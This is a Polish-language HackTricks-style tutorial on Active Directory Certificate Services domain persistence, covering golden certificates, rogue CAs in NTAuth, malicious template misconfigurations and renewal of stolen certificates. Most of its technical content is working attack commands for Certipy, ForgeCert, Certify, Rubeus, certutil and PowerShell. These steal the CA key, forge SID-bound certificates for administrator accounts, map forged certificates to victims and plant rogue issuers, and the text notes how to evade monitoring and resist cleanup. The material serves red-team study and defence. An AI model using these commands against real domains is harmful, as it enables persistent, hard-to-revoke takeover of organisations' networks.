# Persistence domeny AD CS

{{#include ../../../banners/hacktricks-training.md}}

**To podsumowanie technik persistence domeny przedstawionych w [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Więcej szczegółów znajdziesz w tym dokumencie.<sup>[[5]](#references)</sup>

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnionych jest kilka warunków:<sup>[[5]](#references)</sup>

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny jest zabezpieczony przez DPAPI komputera lub przez sprzęt, taki jak TPM/HSM, jeśli system operacyjny go obsługuje.
- Pola Issuer i Subject certyfikatu odpowiadają wyróżniającej nazwie CA.
- Wyłącznie w certyfikatach CA występuje rozszerzenie „CA Version”.
- Certyfikat nie zawiera pól Extended Key Usage (EKU).

Wyodrębnienie klucza prywatnego tego certyfikatu za pomocą narzędzia `certsrv.msc` na serwerze CA jest obsługiwaną metodą wykorzystującą wbudowany interfejs GUI. Certyfikat ten nie różni się jednak od innych certyfikatów przechowywanych w systemie, dlatego do jego wyodrębnienia można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Certyfikat i klucz prywatny można również uzyskać za pomocą Certipy przy użyciu następującego polecenia:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po uzyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx` można wykorzystać narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) do generowania prawidłowych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik wybrany jako cel certificate forgery musi być aktywny i zdolny do uwierzytelniania w Active Directory, aby proces zakończył się powodzeniem. Forging certificate dla kont specjalnych, takich jak krbtgt, jest nieskuteczne.

Ten forged certificate będzie **ważny** do określonej daty końcowej oraz **tak długo, jak ważny jest root CA certificate** (zwykle od **5 do ponad 10 lat**). Jest również ważny dla **maszyn**, więc w połączeniu z **S4U2Self** attacker może **utrzymywać persistence na dowolnej maszynie w domenie** tak długo, jak ważny jest CA certificate.\
Co więcej, **certificates wygenerowane** tą metodą **nie mogą zostać unieważnione**, ponieważ CA nie ma informacji o ich istnieniu.

### Działanie w warunkach Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 r. (po wdrożeniu KB5014754) domain controllers domyślnie stosują **Full Enforcement** dla certificate mappings. W praktyce oznacza to, że forged certificates muszą:

- Zawierać strong binding do konta docelowego (na przykład SID security extension), lub
- Być powiązane z silnym, jawnym mappingiem w atrybucie `altSecurityIdentities` obiektu docelowego.<sup>[[1]](#references)</sup>

Niezawodnym podejściem do persistence jest utworzenie forged certificate powiązanego łańcuchem z przejętym Enterprise CA, a następnie dodanie strong explicit mapping do victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- Jeśli możesz tworzyć sfałszowane certyfikaty zawierające rozszerzenie zabezpieczeń SID, będą one mapowane niejawnie nawet przy Full Enforcement. W przeciwnym razie preferuj jawne strong mappings. Zobacz [account-persistence](account-persistence.md), aby dowiedzieć się więcej o jawnych mapowaniach.
- Unieważnianie nie pomaga tutaj obrońcom: sfałszowane certyfikaty są nieznane bazie danych CA, więc nie można ich unieważnić.

#### Fałszowanie zgodne z Full Enforcement (z obsługą SID)

Zaktualizowane narzędzia pozwalają osadzić SID bezpośrednio, dzięki czemu golden certificates pozostają użyteczne nawet wtedy, gdy kontrolery domeny odrzucają słabe mapowania:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Osadzenie identyfikatora SID pozwala uniknąć modyfikowania `altSecurityIdentities`, które może być monitorowane, a jednocześnie spełnia wymagania silnego mapowania.

## Zaufane certyfikaty Rogue CA - DPERSIST2

Obiekt `NTAuthCertificates` jest przeznaczony do przechowywania co najmniej jednego **certyfikatu CA** w swoim atrybucie `cacertificate`, z którego korzysta Active Directory (AD). Proces weryfikacji przeprowadzany przez **kontroler domeny** polega na sprawdzeniu obiektu `NTAuthCertificates` pod kątem wpisu odpowiadającego **CA określonemu** w polu Issuer uwierzytelniającego **certyfikatu**. Jeśli zostanie znalezione dopasowanie, uwierzytelnianie jest kontynuowane.<sup>[[5]](#references)</sup>

Atakujący może dodać samopodpisany certyfikat CA do obiektu `NTAuthCertificates`, jeśli ma kontrolę nad tym obiektem AD. Zwykle uprawnienia do modyfikowania tego obiektu mają tylko członkowie grupy **Enterprise Admin**, a także **Domain Admins** lub **Administrators** w **domenie głównej lasu**. Mogą oni edytować obiekt `NTAuthCertificates` za pomocą `certutil.exe`, używając polecenia `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, albo korzystając z [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatkowe przydatne polecenia dla tej techniki:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta funkcja jest szczególnie istotna w połączeniu z wcześniej opisaną metodą wykorzystującą ForgeCert do dynamicznego generowania certyfikatów.

> Kwestie mapowania po 2025 roku: umieszczenie rogue CA w NTAuth ustanawia zaufanie wyłącznie do wystawiającego CA. Aby używać certyfikatów końcowych do logowania, gdy kontrolery domeny działają w trybie **Full Enforcement**, certyfikat końcowy musi zawierać rozszerzenie zabezpieczeń SID albo na obiekcie docelowym musi istnieć silne jawne mapowanie (na przykład Issuer+Serial w `altSecurityIdentities`). Zobacz {{#ref}}account-persistence.md{{#endref}}.

## Złośliwa błędna konfiguracja - DPERSIST3

Możliwości uzyskania **persistence** poprzez **modyfikacje deskryptorów zabezpieczeń** komponentów AD CS są liczne. Modyfikacje opisane w sekcji "[Domain Escalation](domain-escalation.md)" mogą zostać złośliwie wprowadzone przez atakującego posiadającego podwyższony dostęp. Obejmuje to dodanie „praw kontrolnych” (np. WriteOwner/WriteDACL/itp.) do wrażliwych komponentów, takich jak:<sup>[[5]](#references)</sup>

- Obiekt **AD computer** serwera **CA**
- **Serwer RPC/DCOM** serwera **CA**
- Dowolny **potomek obiektu AD lub kontener** w **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na przykład kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates itd.)
- **Grupy AD, którym domyślnie lub przez organizację delegowano prawa do kontrolowania AD CS** (takie jak wbudowana grupa Cert Publishers i dowolni jej członkowie)

Przykład złośliwego wdrożenia obejmowałby atakującego posiadającego **podwyższone uprawnienia** w domenie, który dodaje uprawnienie **`WriteOwner`** do domyślnego szablonu certyfikatu **`User`**, wskazując siebie jako principal tego prawa. Aby to wykorzystać, atakujący najpierw zmieniłby właściciela szablonu **`User`** na siebie. Następnie wartość **`mspki-certificate-name-flag`** zostałaby ustawiona na szablonie na **1**, aby włączyć **`ENROLLEE_SUPPLIES_SUBJECT`**, co pozwala użytkownikowi podać Subject Alternative Name w żądaniu. Później atakujący mógłby wykonać **enroll** przy użyciu **szablonu**, wybierając nazwę **domain administrator** jako alternatywną nazwę, a następnie wykorzystać uzyskany certyfikat do uwierzytelnienia jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować w celu uzyskania długoterminowego **domain persistence** (pełne informacje i sposoby wykrywania znajdują się w {{#ref}}domain-escalation.md{{#endref}}):

- Flagi zasad CA zezwalające requesterom na używanie SAN (np. włączenie `EDITF_ATTRIBUTESUBJECTALTNAME2`). Dzięki temu ścieżki podobne do ESC1 pozostają możliwe do wykorzystania.
- DACL szablonu lub ustawienia zezwalające na wydawanie certyfikatów zdolnych do uwierzytelniania (np. dodanie Client Authentication EKU, włączenie `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolowanie obiektu `NTAuthCertificates` lub kontenerów CA w celu ciągłego ponownego wprowadzania rogue issuerów, jeśli obrońcy spróbują przeprowadzić cleanup.

> [!TIP]
> W hardened environments po KB5014754 połączenie tych błędnych konfiguracji z jawnymi silnymi mapowaniami (`altSecurityIdentities`) gwarantuje, że wydane lub sfałszowane certyfikaty pozostaną użyteczne nawet wtedy, gdy kontrolery domeny wymuszą strong mapping.

### Nadużycie odnawiania certyfikatu (ESC14) w celu uzyskania persistence

Jeśli przejmiesz certyfikat zdolny do uwierzytelniania (lub certyfikat Enrollment Agent), możesz go **odnawiać bezterminowo**, dopóki wystawiający szablon pozostaje opublikowany, a CA nadal ufa łańcuchowi wystawcy. Odnowienie zachowuje oryginalne powiązania tożsamości, ale wydłuża okres ważności, przez co eksmisja staje się trudna, chyba że szablon zostanie naprawiony lub CA zostanie ponownie opublikowane.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Jeśli kontrolery domeny są w trybie **Full Enforcement**, dodaj `-sid <victim SID>` (lub użyj template, który nadal zawiera rozszerzenie zabezpieczeń SID), aby odnowiony certyfikat leaf nadal był silnie mapowany bez modyfikowania `altSecurityIdentities`. Attackers posiadający uprawnienia administratora CA mogą również zmienić `policy\RenewalValidityPeriodUnits`, aby wydłużyć okres ważności odnawianych certyfikatów przed wystawieniem sobie certyfikatu.<sup>[[2]](#references)[[4]](#references)</sup>


## Referencje

- [1] [Microsoft KB5014754 – Zmiany dotyczące uwierzytelniania opartego na certyfikatach na kontrolerach domeny Windows (harmonogram enforcement i strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference oraz użycie forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (zintegrowany forge z obsługą SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Przegląd nadużycia odnowień ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Nadużywanie Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
